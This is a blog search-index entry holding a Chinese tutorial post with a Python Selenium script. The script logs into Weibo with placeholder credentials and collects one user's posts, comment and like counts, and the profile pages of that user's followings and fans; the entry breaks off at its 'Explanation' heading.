<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>爬虫项目(4)——微博动态信息获取</title>
    <link href="/2022/10/31/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(4)/"/>
    <url>/2022/10/31/%E7%88%AC%E8%99%AB%E9%A1%B9%E7%9B%AE(4)/</url>
    
    <content type="html"><![CDATA[<h1 id="selenium爬虫项目（4）——微博动态信息获取"><a href="#selenium爬虫项目（4）——微博动态信息获取" class="headerlink" title="selenium爬虫项目（4）——微博动态信息获取"></a>selenium爬虫项目（4）——微博动态信息获取</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>这应该是数据信息获取的最后一篇了，虽然前面的信息获取有些小瑕疵，但是大致的目的还是达到了。</p><h2 id="step1-获取前十个发帖和转发贴"><a href="#step1-获取前十个发帖和转发贴" class="headerlink" title="step1 获取前十个发帖和转发贴"></a>step1 获取前十个发帖和转发贴</h2><h3 id="Code"><a href="#Code" class="headerlink" title="Code:"></a>Code:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-comment">#from browsermobproxy import Server</span><br><span class="hljs-comment">#from selenium.webdriver.chrome.options import Options</span><br><br><span class="hljs-comment">#server = Server(r&quot;C:\Users\lenovo\Desktop\course\内容安全\browsermob\browsermob-proxy-2.1.4\bin\browsermob-proxy.bat&quot;)</span><br><span class="hljs-comment">#server.start()</span><br><span class="hljs-comment">#proxy = server.create_proxy()</span><br><span class="hljs-comment">#chrome_options = Options()</span><br><span class="hljs-comment">#print(proxy.proxy)</span><br><span class="hljs-comment">#chrome_options.add_argument(&#x27;--proxy-server=&#123;0&#125;&#x27;.format(proxy.proxy))</span><br><span class="hljs-comment">#chrome_options.add_argument(&#x27;--ignore-certificate-errors&#x27;)</span><br><span class="hljs-comment">#chrome_options.add_experimental_option(&quot;excludeSwitches&quot;, [&quot;ignore-certificate-errors&quot;])</span><br><br>non_bmp_map=<span class="hljs-built_in">dict</span>.fromkeys(<span class="hljs-built_in">range</span>(<span class="hljs-number">0x10000</span>,sys.maxunicode+<span class="hljs-number">1</span>),<span class="hljs-number">0xfffd</span>)<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    chrome_driver=<span class="hljs-string">&#x27;C:\\Users\\lenovo\\Anaconda3\\Lib\\site-packages\\chromedriver.exe&#x27;</span><br>    driver = webdriver.Chrome(executable_path = chrome_driver)<br>    driver.get(<span class="hljs-string">&#x27;https://www.baidu.com&#x27;</span>)<br>    <span class="hljs-comment">#driver.get(&#x27;https://weibo.com/u/7791772275/home?wvr=5&#x27;)</span><br>    <span class="hljs-keyword">try</span>:<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;kw&quot;]&#x27;</span>).send_keys(<span class="hljs-string">&#x27;微博&#x27;</span>)<br>        time.sleep(<span class="hljs-number">3</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;su&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        <span class="hljs-comment">#driver.find_element_by_xpath(&#x27;//*[@id=&quot;1&quot;]/div/div[1]/h3/a&#x27;).click()</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;2&quot;]/div/div[1]/h3/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">10</span>)<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,3000)&quot;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[1]/div[1]/div[2]/div[1]/div/div/div[3]/div[1]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;app&quot;]/div[4]/div[1]/div/div[2]/div/div/div[5]/a[1]&#x27;</span>).click()<br><br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <br>        <br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).click()<br>        driver.find_element_by_id(<span class="hljs-string">&quot;loginname&quot;</span>).send_keys(<span class="hljs-string">&quot;你的账号&quot;</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/span&#x27;</span>).click()<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_login_form&quot;]/div/div[3]/div[2]/div/input&#x27;</span>).send_keys(<span class="hljs-string">&#x27;你的密码&#x27;</span>)<br>        time.sleep(<span class="hljs-number">5</span>)<br>        driver.find_element_by_class_name(<span class="hljs-string">&#x27;W_btn_a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;dmCheck&quot;]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">1</span>)<br>        driver.find_element_by_id(<span class="hljs-string">&#x27;send_dm_btn&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">20</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/input&#x27;</span>).send_keys(<span class="hljs-string">&quot;等风&quot;</span>)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;plc_top&quot;]/div/div/div[2]/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/ul/li[2]/a&#x27;</span>).click()<br>        <span class="hljs-comment">#driver.find_element_by_xpath(&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[1]/div[2]/div/a[1]&#x27;).click()</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;pl_user_feedList&quot;]/div[2]/div[2]/div/a[1]&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">2</span>)<br>        <br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):  <span class="hljs-comment">#选择十条帖子</span><br>                driver.execute_script(<span class="hljs-string">&quot;window.scrollBy(0,200)&quot;</span>)  <span class="hljs-comment">#滚轮下滑</span><br>                blog1=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[1]&#x27;</span>)<br>                text1=blog1.text   <span class="hljs-comment">#帖子内容</span><br>                <span class="hljs-built_in">print</span>(text1)<br>                zhuanfa1=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[2]/div/ul/li[2]/a/span/span/span/em[2]&#x27;</span>)<br>                text2=zhuanfa1.text   <span class="hljs-comment">#转发数</span><br>                <span class="hljs-built_in">print</span>(text2)<br>                pinglun=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[2]/div/ul/li[3]/a/span/span/span/em[2]&#x27;</span>)<br>                text3=pinglun.text   <span class="hljs-comment">#评论数</span><br>                <span class="hljs-built_in">print</span>(text3)<br>                dianzan1=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[2]/div/ul/li[4]/a/span/span/span/em[2]&#x27;</span>)<br>                text4=dianzan1.text  <span class="hljs-comment">#点赞数</span><br>                <span class="hljs-built_in">print</span>(text4)<br>                time.sleep(<span class="hljs-number">5</span>)<br>                button=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[2]/div/ul/li[3]/a&#x27;</span>)<br>                driver.execute_script(<span class="hljs-string">&quot;arguments[0].click();&quot;</span>,button)   <span class="hljs-comment">#这一步是为了点到那个按钮</span><br>                time.sleep(<span class="hljs-number">5</span>)<br>                <span class="hljs-keyword">if</span> text3!=<span class="hljs-string">&quot;评论&quot;</span>:   <span class="hljs-comment">#讨论评论数是否大于7（大于7会有查看更多内容的按钮）</span><br>                    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(text3)&lt;=<span class="hljs-number">7</span>:<br>                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-built_in">int</span>(text3)+<span class="hljs-number">1</span>):<br>                            <span class="hljs-keyword">try</span>:<br>                                pinglun2=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[3]/div/div/div[3]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[1]&#x27;</span>)<br>                                <span class="hljs-built_in">print</span>(pinglun2.text)  <span class="hljs-comment">#评论内容</span><br>                                time2=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[3]/div/div/div[3]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[3]/div[2]&#x27;</span>)<br>                                <span class="hljs-built_in">print</span>(time2.text)  <span class="hljs-comment">#评论时间</span><br>                                dianzan2=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[<span class="hljs-subst">&#123;k+<span class="hljs-number">1</span>&#125;</span>]/div[3]/div/div/div[3]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[3]/div[1]/ul/li[4]/span/a/span/em[2]&#x27;</span>)<br>                                <span class="hljs-built_in">print</span>(dianzan2.text)  <span class="hljs-comment">#点赞数</span><br>                            <span class="hljs-keyword">except</span>:<br>                                <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">try</span>:<br>                    driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_MyProfileFeed__18&quot;]/div/div[2]/div[3]/div/div/div[3]/div[2]/div/a&#x27;</span>).click()<br>                    driver.switch_to.window(driver.window_handles[-<span class="hljs-number">1</span>])<br>                    time.sleep(<span class="hljs-number">5</span>)<br>                    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>                        pinglunn=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_WeiboDetail__70&quot;]/div/div/div/div[4]/div/div[3]/div[2]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[1]&#x27;</span>)<br>                        <span class="hljs-built_in">print</span>(pinglunn.text)<br>                        <span class="hljs-keyword">try</span>:<br>                            pinglun_t=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_WeiboDetail__70&quot;]/div/div/div/div[4]/div/div[3]/div[2]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[3]/div[2]&#x27;</span>)<br>                            <span class="hljs-built_in">print</span>(pinglun_t.text)<br>                        <span class="hljs-keyword">except</span>:<br>                            pinglun_t=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_WeiboDetail__70&quot;]/div/div/div/div[4]/div/div[3]/div[2]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[4]/div[2]&#x27;</span>)<br>                            <span class="hljs-built_in">print</span>(pinglun_t.text)<br>                        <span class="hljs-keyword">try</span>:<br>                            pldz=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_WeiboDetail__70&quot;]/div/div/div/div[4]/div/div[3]/div[2]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[3]/div[1]/ul/li[4]/span/a/span/em[2]&#x27;</span>)<br>                            <span class="hljs-built_in">print</span>(pldz.text)<br>                        <span class="hljs-keyword">except</span>:<br>                            pldz=driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_WeiboDetail__70&quot;]/div/div/div/div[4]/div/div[3]/div[2]/div/div/div[<span class="hljs-subst">&#123;i&#125;</span>]/div[2]/div[4]/div[1]/ul/li[4]/span/a/span/em[2]&#x27;</span>)<br>                            <span class="hljs-built_in">print</span>(pldz.text)<br>                        time.sleep(<span class="hljs-number">1</span>)<br>                    driver.close()<br>                    driver.switch_to.window(driver.window_handles[<span class="hljs-number">0</span>])<br>                    time.sleep(<span class="hljs-number">2</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;finish blog&quot;</span>)<br>        <br><br>        <span class="hljs-comment">#proxy.new_har(&quot;blog&quot;, options=&#123;&#x27;captureHeaders&#x27;: True, &#x27;captureContent&#x27;: True&#125;)</span><br>        <span class="hljs-comment">#proxy.new_har(&quot;blog&quot;)</span><br>        time.sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-comment">#source=driver.page_source</span><br>        <span class="hljs-comment">#result=proxy.har</span><br>        <span class="hljs-comment">#with open(&#x27;test.har&#x27;,&#x27;w&#x27;,encoding=&#x27;utf-8&#x27;) as f:</span><br>        <span class="hljs-comment">#    f.write(str(result))</span><br>        <span class="hljs-comment">#    print(&quot;ok&quot;)</span><br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a/span&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        handles=driver.window_handles<br>        <span class="hljs-keyword">for</span> handle <span class="hljs-keyword">in</span> handles:<br>            <span class="hljs-keyword">if</span> handle!=driver.current_window_handle:<br>                driver.close()<br>                driver.switch_to.window(handle)<br>        time.sleep(<span class="hljs-number">10</span>)<br>        source=driver.page_source<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;information1.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>        <br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__50&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>            <span class="hljs-keyword">try</span>:<br>                driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_HisRelation__56&quot;]/div/div/div/div[2]/div[1]/ul/li[<span class="hljs-subst">&#123;i&#125;</span>]/dl/dd[1]/div[1]/a[1]&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br>        guanzhu=driver.window_handles[<span class="hljs-number">1</span>:]<br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(guanzhu)):<br>            time.sleep(<span class="hljs-number">1</span>)<br>            driver.switch_to.window(guanzhu[<span class="hljs-built_in">len</span>(guanzhu)-<span class="hljs-number">1</span>-i])<br>            <span class="hljs-keyword">try</span>:<br>                time.sleep(<span class="hljs-number">3</span>)<br>                <span class="hljs-keyword">try</span>:<br>                    guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                    fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(fans1.text)<br>                    blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(blogs.text)<br>                <span class="hljs-keyword">except</span>:<br>                    guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                    fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(fans1.text)<br>                    blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/a/strong&#x27;</span>)<br>                    <span class="hljs-built_in">print</span>(blogs.text)<br>                driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">3</span>)<br>                source=driver.page_source<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;关注_<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>                time.sleep(<span class="hljs-number">1</span>)<br>                driver.close()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no info&quot;</span>)<br>                driver.close()<br><br>            time.sleep(<span class="hljs-number">2</span>)<br>        driver.switch_to.window(driver.window_handles[<span class="hljs-number">0</span>])<br>        driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Official_HisRelationNav__55&quot;]/div/div[2]/div[1]/div/div/div/div/ul/li[2]/a&#x27;</span>).click()<br>        time.sleep(<span class="hljs-number">5</span>)<br>        <br>        <br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">11</span>):<br>            <span class="hljs-keyword">try</span>:<br>                driver.find_element_by_xpath(<span class="hljs-string">f&#x27;//*[@id=&quot;Pl_Official_HisRelation__56&quot;]/div/div/div/div[2]/div[1]/ul/li[<span class="hljs-subst">&#123;i&#125;</span>]/dl/dd[1]/div[1]/a[1]&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">continue</span><br>        fans=driver.window_handles[<span class="hljs-number">1</span>:]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(fans)):<br>            time.sleep(<span class="hljs-number">1</span>)<br>            driver.switch_to.window(fans[<span class="hljs-built_in">len</span>(fans)-<span class="hljs-number">1</span>-i])<br>            <span class="hljs-keyword">try</span>:<br>                time.sleep(<span class="hljs-number">3</span>)<br>                guanzhu1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[1]/a/strong&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(guanzhu1.text)<br>                fans1=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[2]/a/strong&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(fans1.text)<br>                blogs=driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_T8CustomTriColumn__3&quot;]/div/div/div/table/tbody/tr/td[3]/a/strong&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(blogs.text)<br>                driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;Pl_Core_UserInfo__6&quot;]/div[2]/div[1]/div/a&#x27;</span>).click()<br>                time.sleep(<span class="hljs-number">3</span>)<br>                source=driver.page_source<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;粉丝_<span class="hljs-subst">&#123;i&#125;</span>.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    f.write(<span class="hljs-built_in">str</span>(source).translate(non_bmp_map))<br>                time.sleep(<span class="hljs-number">1</span>)<br>                driver.close()<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;no info&quot;</span>)<br>                driver.close()<br><br>            time.sleep(<span class="hljs-number">2</span>)<br>        <br>    <span class="hljs-keyword">finally</span>:<br>        time.sleep(<span class="hljs-number">30</span>)<br>        driver.quit()<br><br></code></pre></td></tr></table></figure><h3 id="Explanation"><a href="#Explanation" class="headerlink" 